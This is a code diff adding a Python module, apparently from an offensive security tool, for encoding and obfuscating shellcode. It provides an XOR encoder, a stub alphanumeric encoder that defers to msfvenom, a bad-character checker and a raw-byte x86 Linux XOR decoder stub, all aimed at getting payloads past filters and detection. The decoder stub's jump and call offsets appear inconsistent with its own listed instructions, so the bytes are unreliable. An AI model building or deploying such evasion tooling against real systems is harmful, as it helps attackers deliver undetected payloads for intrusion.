@@ -1,0 +1,131 @@
+"""
+Encoding operations for shellcode obfuscation and evasion.
+"""
+
+import logging
+
+from ofx.settings import settings
+
+logger = logging.getLogger(settings.app_branding)
+
+
+def encode_xor(shellcode: bytes, key: int = 0xAA) -> bytes:
+    """
+    XOR encode shellcode with a key.
+
+    Args:
+        shellcode: Raw shellcode bytes
+        key: XOR key (0x00-0xFF)
+
+    Returns:
+        XOR encoded shellcode
+
+    Example:
+        >>> sc = b"\\x90\\x90\\x90"
+        >>> encoded = encode_xor(sc, key=0xAA)
+        >>> # Decoder stub needed in target to XOR back
+    """
+    return bytes([b ^ key for b in shellcode])
+
+
+def encode_alphanum(shellcode: bytes) -> bytes:
+    """
+    Alphanumeric encoding (basic implementation).
+
+    Note: This is a placeholder. For production use, integrate with
+    tools like msfvenom's alpha_mixed encoder.
+
+    Args:
+        shellcode: Raw shellcode bytes
+
+    Returns:
+        Alphanumeric encoded shellcode
+    """
+    logger.warning(
+        "Alphanumeric encoding not fully implemented - use msfvenom for production"
+    )
+    return shellcode
+
+
+def remove_bad_chars(shellcode: bytes, bad_chars: list[str]) -> tuple[bytes, bool]:
+    """
+    Check for bad characters in shellcode and warn if found.
+
+    Args:
+        shellcode: Raw shellcode bytes
+        bad_chars: List of bad characters (e.g., ["\\x00", "\\x0a", "\\x0d"])
+
+    Returns:
+        Tuple of (shellcode, has_bad_chars)
+
+    Example:
+        >>> sc = b"\\x00\\x90\\x90"
+        >>> clean_sc, has_bad = remove_bad_chars(sc, ["\\x00"])
+        >>> if has_bad:
+        ...     print("Warning: Bad characters found!")
+    """
+    bad_bytes = []
+    for c in bad_chars:
+        if "\\x" in c:
+            try:
+                bad_bytes.append(bytes.fromhex(c.replace("\\x", "")))
+            except ValueError:
+                logger.warning(f"Invalid bad char format: {c}")
+        else:
+            bad_bytes.append(c.encode())
+
+    has_bad_chars = False
+    for bad in bad_bytes:
+        if bad in shellcode:
+            logger.warning(
+                f"Bad character {bad.hex()} found in shellcode at position {shellcode.find(bad)}"
+            )
+            has_bad_chars = True
+
+    return shellcode, has_bad_chars
+
+
+def create_decoder_stub_xor(key: int = 0xAA, shellcode_size: int = 0) -> bytes:
+    """
+    Create a simple XOR decoder stub (x86 Linux example).
+
+    This is a basic example. For production, use encoders from frameworks
+    like Metasploit which handle more complex scenarios.
+
+    Args:
+        key: XOR key used for encoding
+        shellcode_size: Size of encoded shellcode
+
+    Returns:
+        Decoder stub bytes
+    """
+    # Simple XOR decoder for x86 Linux
+    # jmp short call_shellcode
+    # decoder:
+    #   pop esi              ; get address of encoded shellcode
+    #   xor ecx, ecx
+    #   mov cl, shellcode_size
+    # decode:
+    #   xor byte [esi], key
+    #   inc esi
+    #   loop decode
+    #   jmp short shellcode
+    # call_shellcode:
+    #   call decoder
+    #   ; encoded shellcode follows
+
+    decoder = (
+        b"\xeb\x0b"  # jmp short call_shellcode
+        b"\x5e"  # pop esi
+        b"\x31\xc9"  # xor ecx, ecx
+        b"\xb1"
+        + bytes([shellcode_size & 0xFF])  # mov cl, size
+        + b"\x80\x36"
+        + bytes([key])  # xor byte [esi], key
+        + b"\x46"  # inc esi
+        b"\xe2\xfa"  # loop decode
+        b"\xeb\x05"  # jmp short shellcode
+        b"\xe8\xf0\xff\xff\xff"  # call decoder
+    )
+
+    return decoder
